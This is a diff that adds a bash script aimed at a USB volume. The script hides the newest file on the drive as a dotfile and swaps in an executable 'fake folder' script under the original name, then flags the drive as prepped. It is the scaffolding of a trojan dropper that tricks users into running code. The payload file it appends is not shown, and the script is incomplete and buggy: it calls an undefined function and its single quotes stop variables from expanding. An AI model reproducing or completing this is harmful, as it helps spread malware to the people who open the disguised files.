@@ -1,0 +1,44 @@
+#!/bin/bash
+
+# TODO: implement a find_target algorithm
+find_target_dir() {
+	echo 'Looking for directory to target...'
+	#-i-#
+	target_dir='/volumes/KINGSTON/'
+	echo 'Target directory: $target_dir'
+}
+
+find_latest_file() {
+	echo 'Looking for file to target...'
+	target_file=`ls -rt | tail -n 1`
+	target_file_path=$target_dir$target_file
+
+	# TODO: remove extension from target_file name
+	target_file_name=$target_file
+	echo 'Target file: $target_file'
+}
+
+prep_dir() {
+	# Hide target file
+	mv $target_file_path '$target_dir.$target_file'
+
+	# Make fake folder exec
+	echo "#!/bin/bash" > temp_dir_script
+	echo "target_file='$target_file'" >> temp_dir_script
+	cat dir_script >> temp_dir_script
+	chmod +x temp_dir_script
+
+	# Transfer fake folder exec
+	mv temp_dir_script $target_dir$target_file_name
+}
+
+flag_dir() {
+	# Flag dir as already prepped
+	touch $target_dir.flag
+}
+
+# Execution
+find_target
+find_latest_file
+prep_dir
+flag_dir
